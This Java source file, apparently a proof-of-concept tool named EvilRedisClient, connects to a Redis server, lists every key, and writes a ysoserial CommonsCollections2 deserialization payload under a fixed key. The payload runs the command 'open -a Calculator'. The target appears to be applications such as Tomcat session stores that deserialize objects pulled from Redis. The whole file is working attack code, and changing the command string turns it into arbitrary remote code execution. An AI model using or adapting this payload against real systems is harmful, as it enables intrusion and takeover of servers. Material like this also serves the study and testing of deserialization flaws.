package com.nosqlclient.tomcat;

import redis.clients.jedis.Jedis;
import redis.clients.jedis.exceptions.JedisException;
import ysoserial.payloads.ObjectPayload;
import java.util.Base64;
import java.util.Iterator;
import java.util.Set;

public class EvilRedisClient {
    //address of your redis server
    private static Jedis jedis = null;

    public static void main(String[] args) {
            EvilRedisClient rc = new EvilRedisClient();
            rc.getAllKeys();   // get all redis keys
            rc.setValue();     // set the value of the key
            rc.getValue();       // get the value of the key
        }

    public EvilRedisClient() {
        //configure  connection
        final String redisHost = "127.0.0.1";
        final Integer redisPort = 6379;
        jedis = new Jedis(redisHost, redisPort);
    }

    public void getAllKeys(){

        Set<byte[]> keys = jedis.keys("*".getBytes());
        Iterator<byte[]> it = keys.iterator();
        while(it.hasNext()){
            byte[] data = it.next();
            String keyNames = new String(data, 0, data.length);
            System.out.println(String.format("%s%s",keyNames,"\r\n"));
        }
    }


    public void setValue() {
        //let us first add some data in our redis server using Redis SET.
        byte[] key = "5C48BC1BA528EF67F545700BA39DE398".getBytes();
        Object payloadObject = ObjectPayload.Utils.makePayloadObject("CommonsCollections2", "open -a Calculator");
        byte[] SerialData = SerializeUtil.serialize(payloadObject);
        try {
        //save to redis
        jedis.set(key, SerialData);
        } catch (JedisException e) {
            if (null != jedis) {
                        jedis.close();
            }
        } finally {
                if (null != jedis){
                    try {
                        jedis.close();
                    }catch (Exception e){
                            System.out.println("Redis Server is Closed...");
                            e.printStackTrace();
                }
            }
        }
    }

    public void getValue(){
        byte[] key = "5C48BC1BA528EF67F545700BA39DE398".getBytes();

        // Raw Java Serialization Data
        String rawString  = Base64.getEncoder().encodeToString(jedis.get(key));
        byte[] decodedBytes = Base64.getDecoder().decode(rawString);
        System.out.println(new String(decodedBytes));

        // Base64 Java Serialization Data
        String base64String = Base64.getEncoder().encodeToString(jedis.get(key));
        System.out.println(String.format("%s%s","\r\n",base64String));
    }
}
